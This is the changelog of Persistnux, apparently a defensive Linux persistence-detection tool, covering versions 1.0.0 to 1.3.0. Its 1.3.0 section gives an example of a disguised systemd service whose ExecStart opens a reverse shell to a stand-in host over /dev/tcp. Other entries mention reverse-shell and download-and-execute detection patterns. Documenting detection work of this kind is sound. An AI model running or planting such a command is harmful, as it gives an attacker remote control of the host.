# Changelog

All notable changes to Persistnux will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [1.3.0] - 2026-01-23

### Changed
- **SECURITY IMPROVEMENT**: Replaced name-based service whitelisting with content-based validation
  - Removed `KNOWN_GOOD_SERVICES` array (service name whitelist)
  - Added `KNOWN_GOOD_EXECUTABLE_PATHS` array (trusted binary paths)
  - Added `KNOWN_GOOD_COMMAND_PATTERNS` array (safe command patterns)
  - Added `NEVER_WHITELIST_PATTERNS` array (always malicious patterns)
- **New Function**: `is_command_safe()` replaces `is_known_good_service()`
  - Validates based on what is being executed, not the service name
  - Prevents attackers from hiding malicious commands in legitimate-sounding service names
  - Three-tier validation: 1) Check for dangerous patterns, 2) Check for safe paths, 3) Check for safe patterns

### Security Rationale
**Why This Matters**: Attackers can easily create services named `systemd-update.service` or `dbus-monitor.service` to bypass name-based filtering. Content-based validation ensures that even if the service name looks legitimate, the actual command being executed is analyzed.

**Example Attack Prevented**:
```systemd
# Service name: systemd-timesync.service (looks legitimate)
# ExecStart: /bin/bash -c 'bash -i >& /dev/tcp/evil.com/4444'
# v1.2: Would be whitelisted by name
# v1.3: Detected as HIGH confidence (dangerous command pattern)
```

### Improved
- More accurate detection: Legitimately named services with malicious commands now detected
- Fewer false negatives: Mimicked service names no longer bypass detection
- Better confidence scoring: Safe system binaries automatically get LOW confidence

## [1.2.0] - 2026-01-23

### Added
- **False Positive Reduction**: Package manager integration to identify files managed by dpkg/rpm
- **Known-Good Service Whitelist**: Automatic filtering of common legitimate services (systemd-*, dbus-*, snap.*, etc.)
- **Suspicious-Only Filter Mode** (DEFAULT): By default, only shows MEDIUM/HIGH/CRITICAL findings
- **Command-Line Arguments**: Added `--help`, `--all`, `--min-confidence` options
- **Flexible Filtering**: Environment variables `FILTER_MODE` and `MIN_CONFIDENCE` for output control
- **Package Status in Output**: Additional info field now includes package management status
- Function `is_package_managed()`: Checks if files are managed by package managers
- Function `is_known_good_service()`: Checks if systemd service matches known-good patterns
- Function `adjust_confidence_for_package()`: Downgrades confidence for package-managed files
- Function `should_include_finding()`: Filters findings based on confidence and mode
- Function `show_usage()`: Comprehensive help text with examples
- Known-good service patterns array with 30+ common legitimate services
- Enhanced documentation in README.md explaining filtering and false positive reduction

### Changed
- **DEFAULT BEHAVIOR**: Now shows only suspicious findings (MEDIUM/HIGH/CRITICAL) instead of all findings
- Confidence scoring now considers package management status
- Package-managed files with HIGH confidence are downgraded to MEDIUM
- Package-managed files with MEDIUM confidence are downgraded to LOW
- Known vendor services are now automatically skipped during systemd detection
- Output now includes package information (e.g., "package=dpkg:openssh-server" or "package=unmanaged")
- Banner now displays active filter mode and minimum confidence level

### Improved
- **Dramatically reduced output noise**: LOW confidence baseline findings hidden by default
- Reduced false positives from legitimate distribution-managed persistence mechanisms
- More accurate confidence scoring for DFIR investigations
- Better signal-to-noise ratio for HIGH confidence findings
- Faster triage: analysts can immediately focus on suspicious items
- Backward compatible: use `--all` to see all findings like v1.1

## [1.1.0] - 2026-01-23

### Fixed
- **CRITICAL BUG FIX**: Fixed script exiting prematurely after first finding
  - Changed `((FINDINGS_COUNT++))` to `FINDINGS_COUNT=$((FINDINGS_COUNT + 1))` in `log_finding()`
  - This was causing the script to exit when `set -euo pipefail` encountered arithmetic returning 0
  - All findings now properly logged and written to output files

### Added
- Enhanced reverse shell detection patterns: `/dev/tcp/`, `/dev/udp/`
- Comprehensive suspicious pattern arrays based on PANIX and Elastic Security Labs research
- SUSPICIOUS_INDICATORS.md documentation
- DFIR_GUIDE.md for incident response workflows
- CONTRIBUTING.md for community contributions
- Example output files in examples/ directory

### Changed
- Updated detection patterns in all modules (systemd, cron, shell profiles)
- Improved time-based confidence scoring (files <7 days = HIGH)
- Enhanced grep patterns for reverse shell detection

## [1.0.0] - 2026-01-22

### Initial Release

#### Features
- Comprehensive Linux persistence detection across 7 major categories
- Live system analysis with bash script
- Dual output format: CSV and JSONL
- SHA256 file hashing for all detected files
- Detailed file metadata collection (permissions, ownership, timestamps)
- Confidence scoring system (LOW, MEDIUM, HIGH, CRITICAL)
- Root and non-root operation modes

#### Detection Modules
1. **Systemd Services**: Service files, timers, sockets across all systemd paths
2. **Cron Jobs**: System crontabs, user crontabs, at jobs, periodic scripts
3. **Shell Profiles**: System and user profile files, RC files, profile.d scripts
4. **SSH Persistence**: Authorized keys, SSH configs, daemon configuration
5. **Init Scripts**: rc.local, SysV init scripts, runlevel scripts
6. **Kernel & Preload**: LD_PRELOAD, kernel modules, dynamic linker configs
7. **Additional Mechanisms**: XDG autostart, environment files, sudoers, PAM, MOTD

#### Suspicious Pattern Detection
- Network-based reverse shell patterns (12 patterns)
- Download and execute commands (17 patterns)
- Suspicious file locations
- Obfuscation techniques

#### Output Features
- Timestamp for all findings
- Category and subcategory classification
- File location and description
- Confidence level
- SHA256 hash
- Detailed metadata string
- Additional contextual information

#### Documentation
- Comprehensive README.md
- Usage examples
- DFIR workflow integration guides
- Requirements and installation instructions

---

## Version History Summary

- **v1.2.0**: False positive reduction with package manager integration
- **v1.1.0**: Critical bug fix + enhanced detection patterns
- **v1.0.0**: Initial release with comprehensive persistence detection
